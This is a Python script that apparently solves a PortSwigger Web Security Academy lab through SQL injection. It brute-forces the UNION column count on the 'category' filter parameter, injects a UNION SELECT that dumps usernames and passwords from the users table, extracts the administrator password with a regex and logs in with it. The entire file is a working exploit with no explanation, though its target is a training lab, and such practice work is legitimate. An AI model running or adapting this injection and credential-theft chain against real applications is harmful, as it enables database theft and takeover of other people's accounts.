import requests
import re
from bs4 import BeautifulSoup

url = "https://0aad007603c5c0b082ec156f0002005a.web-security-academy.net"

cookies = {
    "session": "nrCfHXimEps8tf33bsV0N9vBVbxGGmcy"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://portswigger.net/",
    "Accept-Language": "en-US,en;q=0.9"
}


def has_error(text):
    return (
        "Internal Server Error" in text
        or "error" in text.lower()
        or "syntax" in text.lower()
    )



correct_column_count = None
for column_count in range(1, 20):
    nulls = ", ".join(["NULL"] * column_count)

    payload = f"Accessories' UNION SELECT {nulls}-- -"

    params = {
        "category": payload
    }

    r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params=params)

    if r.status_code == 200 and not has_error(r.text):
        correct_column_count = column_count
        print(f"[+] Column count: {correct_column_count}")
        break
if correct_column_count is None:
    print("[-] Correct column count not found.")
    exit()
column_count = ["NULL"] * correct_column_count

table_name = "users"
username_column = "username"
password_column = "password"



final_payload = f"Accessories' UNION SELECT {username_column}, {password_column} FROM {table_name}-- -"
params = {
    "category": final_payload
}
r = requests.get(f"{url}/filter", headers=headers, cookies=cookies, params=params)
password = re.search(r'administrator</th>\s*<td>(.*?)</td>', r.text).group(1)
username = "administrator"



s = requests.Session()
r = s.get(f"{url}/login", headers=headers, cookies=cookies)

soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "username" : username,
    "password" : password,
    "csrf" : csrf
}

r = requests.post(f"{url}/login", headers=headers, cookies=cookies, data=data)

if "Your username is: administrator" in r.text:
    print("[+] Lab is Solved!")
else:
    print("[-] Lab is not solved yet.")

if "Internal Server Error" in r.text:
    print("[-] Internal Server Error")

# print(r.text)